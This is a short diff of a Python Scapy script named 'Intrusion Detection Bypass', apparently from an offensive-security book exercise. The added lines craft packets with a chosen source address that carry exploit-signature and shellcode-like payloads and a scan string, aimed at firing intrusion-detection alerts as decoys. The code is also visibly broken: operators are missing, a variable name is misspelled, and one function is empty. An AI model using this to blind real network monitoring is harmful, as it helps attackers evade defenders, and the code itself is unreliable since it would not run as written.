@@ -3,15 +3,19 @@ import optparse
 from scapy.all import *
 from random import randint
 
-
 def banner():
 	print "[***]	Intrusion Detection Bypass p 166	[***]"
 
 def ddosTest(src, dst, iface, count):
 
 def exploitTest(src, dst, iface, count):
+	pkt = IP(src=src, dst=dst)/ UDP(dport=518) Raw(load="\x01\x03\x00\x00\x00\x00\x00\x01\x00\x02\x02\xE8")
+	send(pkt, iface=iface, count=count)
+	pkt = IP(src=src, dst=dst) / UDP(dport=7) Raw(load="\xB0\x02\x89\xFE\xC8\x89F\x04\xB0\x06\x89F")
 
 def scanTest(src, dst, iface, count):
+	pkt= IP(src= src, dst=dst) / UDP(dport=10080) Raw(load='Amanda')
+	send(pkt, iface=iface, count = cpount)
 
 def main():
 	parser = optparse.OptionParser('usage%prog '+'-i <interface>')
